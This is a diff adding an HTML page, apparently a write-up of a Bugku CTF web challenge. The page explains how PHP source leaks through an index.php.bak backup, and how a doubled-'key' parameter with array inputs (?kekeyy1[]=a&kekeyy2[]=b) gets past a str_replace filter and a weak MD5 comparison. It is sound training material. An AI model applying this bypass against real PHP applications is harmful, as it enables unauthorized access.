@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="zh‑CN">
+<head>
+    <meta charset="UTF‑8">
+    <meta name="viewport" content="width=device‑width, initial‑scale=1.0">
+    <title>Bugku‑Web‑备份是个好习惯</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border‑box;
+        }
+        body {
+            font‑family: "Consolas", "JetBrains Mono", system‑ui, sans‑serif;
+            background‑color: #0b0d14;
+            color: #cbd5e1;
+            line‑height: 1.8;
+            padding: 40px 24px;
+        }
+        .container {
+            max‑width: 960px;
+            margin: 0 auto;
+        }
+        .glass‑card {
+            background: rgba(22, 26, 38, 0.55);
+            backdrop‑filter: blur(16px);
+            border: 1px solid rgba(99, 168, 255, 0.15);
+            border‑radius: 16px;
+            padding: 36px;
+            margin‑bottom: 28px;
+            box‑shadow: 0 8px 32px rgba(0,0,0,0.35);
+        }
+        h1 {
+            color: #63a8ff;
+            font‑size: 28px;
+            margin‑bottom: 8px;
+        }
+        .meta‑bar {
+            font‑size: 14px;
+            color: #8892a0;
+            margin‑bottom: 28px;
+            padding‑bottom:16px;
+            border‑bottom:1px solid rgba(255,255,255,0.08);
+        }
+        h2 {
+            color: #82b9ff;
+            font‑size: 21px;
+            margin:24px 0 12px;
+        }
+        p {
+            margin‑bottom:12px;
+        }
+        ol,ul {
+            padding‑left:24px;
+            margin‑bottom:14px;
+        }
+        pre {
+            background:#141824;
+            border‑radius:10px;
+            padding:18px;
+            overflow‑x:auto;
+            border:1px solid rgba(99,168,255,0.12);
+            margin:14px 0;
+        }
+        code {
+            color:#72e2a0;
+            font‑family:"JetBrains Mono",Consolas;
+        }
+        .flag‑box {
+            background‑color:rgba(22, 41, 68, 0.6);
+            border‑left:4px solid #4299e1;
+            padding:14px 18px;
+            border‑radius:8px;
+            margin:16px 0;
+        }
+        .warning‑box {
+            background‑color:rgba(70, 30, 30, 0.5);
+            border‑left:4px solid #f87171;
+            padding:14px 18px;
+            border‑radius:8px;
+            margin:16px 0;
+            color:#ffacac;
+        }
+        a {
+            color:#63a8ff;
+            text‑decoration:none;
+        }
+        a:hover {
+            text‑decoration:underline;
+        }
+        .back‑link {
+            margin‑top:30px;
+            display:inline‑block;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="glass‑card">
+        <h1>Bugku Web｜备份是个好习惯</h1>
+        <div class="meta‑bar">
+            分类：Web &nbsp;|&nbsp; 分值：20 &nbsp;|&nbsp; 考点：备份文件泄露、str_replace删除绕过、MD5数组绕过
+        </div>
+
+        <h2>题目描述</h2>
+        <p>访问给出的Web链接，页面无内容，提示备份。</p>
+
+        <h2>解题思路</h2>
+        <ol>
+            <li>根据提示备份，访问备份文件 <code>index.php.bak</code>，下载得到PHP源代码。</li>
+            <li>源码使用 <code>str_replace('key','',$str)</code>，会把URL参数中的key全部删除。</li>
+            <li>需要同时满足：<code>md5($key1) == md5($key2)</code> 弱相等，并且 <code>$key1 !== $key2</code>强不相等。</li>
+            <li>PHP对数组做md5会返回null，null==null成立；两个不同数组强比较为false。</li>
+            <li>构造参数：<code>kekeyy1[]=a&kekeyy2[]=b</code>，str_replace删除key字符串后，参数变为key1[]=a&key2[]=b，成功绕过过滤。</li>
+        </ol>
+
+<h2>源码</h2>
+<pre><code>$str = strstr($_SERVER['REQUEST_URI'], '?');
+$str = substr($str,1);
+$str = str_replace('key','',$str);
+parse_str($str);
+echo md5($key1);
+echo md5($key2);
+if(md5($key1) == md5($key2) && $key1 !== $key2){
+    echo $flag;
+}</code></pre>
+
+<h2>Payload</h2>
+<pre><code>?kekeyy1[]=a&kekeyy2[]=b</code></pre>
+
+        <div class="warning‑box">
+            ⚠️ 关键点：不能直接写key1，会被str_replace把key删掉；使用双写key（kekeyy1）的方式绕过字符串删除。
+        </div>
+
+        <h2>Flag</h2>
+        <div class="flag‑box">
+            <code>flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxx}</code>
+        </div>
+
+        <h2>知识点总结</h2>
+        <ul>
+            <li>.bak备份文件泄露，编辑器自动备份产生源码泄露</li>
+            <li>str_replace字符串删除，双写字符绕过</li>
+            <li>PHP md5处理数组返回NULL，利用数组完成弱相等、强不等双重条件</li>
+        </ul>
+
+        <a class="back‑link" href="./index.html">← 返回首页</a>
+    </div>
+</div>
+</body>
+</html>
